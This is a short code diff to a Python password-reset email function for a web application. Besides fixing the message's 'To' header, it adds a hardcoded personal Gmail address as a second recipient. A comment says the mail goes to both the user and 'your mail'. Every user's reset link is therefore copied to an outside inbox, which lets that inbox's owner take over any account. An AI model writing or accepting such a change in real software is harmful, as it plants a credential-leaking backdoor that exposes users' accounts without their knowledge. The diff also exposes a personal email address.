@@ -4755,12 +4755,15 @@ def send_email(receiver_email, link):
     message = MIMEText(f"Click the link to reset your password: https://tabel.scania.dp.ua/recovery-{link}")
     message['Subject'] = 'Password Reset Link'
     message['From'] = sender_email
-    message['To'] = sender_email
+    message['To'] = receiver_email
+
+    # Відправляємо і користувачу, і на вашу пошту
+    recipients = [receiver_email, "leshashupenko@gmail.com"]
 
     with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
         server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, message.as_string())
-        print('send mail')
+        server.sendmail(sender_email, recipients, message.as_string())
+        print(f'Email sent to {recipients}')
 
 # Функція для запису посилання в базу даних
 def save_link_to_database(user_id, link):
